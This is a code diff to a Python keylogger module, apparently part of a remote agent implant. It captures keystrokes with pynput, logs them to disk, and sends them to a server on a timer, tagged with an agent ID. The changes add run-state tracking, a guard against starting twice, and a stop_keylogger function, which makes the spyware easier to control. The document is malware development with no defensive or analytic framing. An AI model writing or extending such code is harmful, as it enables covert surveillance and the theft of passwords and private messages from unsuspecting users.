@@ -32,6 +32,8 @@ SEND_BUFFER = []
 PRESSED_KEYS = set()
 LOCK = threading.Lock()
 AGENT_ID = None
+RUNNING = False
+LISTENER = None
 
 # =========================
 # FILE SETUP
@@ -152,7 +154,7 @@ def _flush_to_disk():
 # =========================
 def _send_to_disk_loop():
     """Background thread to flush logs to disk at intervals."""
-    while True:
+    while RUNNING:
         time.sleep(KEYLOG_FLUSH_INTERVAL)
 
         try:
@@ -193,7 +195,7 @@ def _flush_to_server():
 # SEND TO SERVER (slower, to avoid spamming)
 # =================================================
 def _send_to_server_loop():
-    while True:
+    while RUNNING:
         time.sleep(KEYLOG_SEND_INTERVAL)
 
         try:
@@ -205,13 +207,18 @@ def _send_to_server_loop():
 # PUBLIC API
 # =========================
 def start_keylogger(agent_id: str | None) -> Optional["keyboard.Listener"]:
-    global AGENT_ID
+    global AGENT_ID, RUNNING, LISTENER
 
     if keyboard is None:
         logger.warning("pynput not installed, keylogger disabled")
         return None
 
+    if RUNNING and LISTENER is not None:
+        logger.info("Keylogger already running.")
+        return LISTENER
+
     AGENT_ID = agent_id
+    RUNNING = True
 
     _ensure_file()
 
@@ -222,6 +229,7 @@ def start_keylogger(agent_id: str | None) -> Optional["keyboard.Listener"]:
 
     listener.daemon = True
     listener.start()
+    LISTENER = listener
 
     # disk flush thread (faster)
     disk_thread = threading.Thread(target=_send_to_disk_loop, daemon=True)
@@ -234,3 +242,16 @@ def start_keylogger(agent_id: str | None) -> Optional["keyboard.Listener"]:
     logger.info(f"Keylogger started -> {KEYLOG_FILE}")
 
     return listener
+
+
+def stop_keylogger():
+    """Stop keylogger threads and listener."""
+    global RUNNING, LISTENER
+    RUNNING = False
+    if LISTENER is not None:
+        try:
+            LISTENER.stop()
+        except Exception:
+            pass
+        LISTENER = None
+    logger.info("Keylogger stopped.")
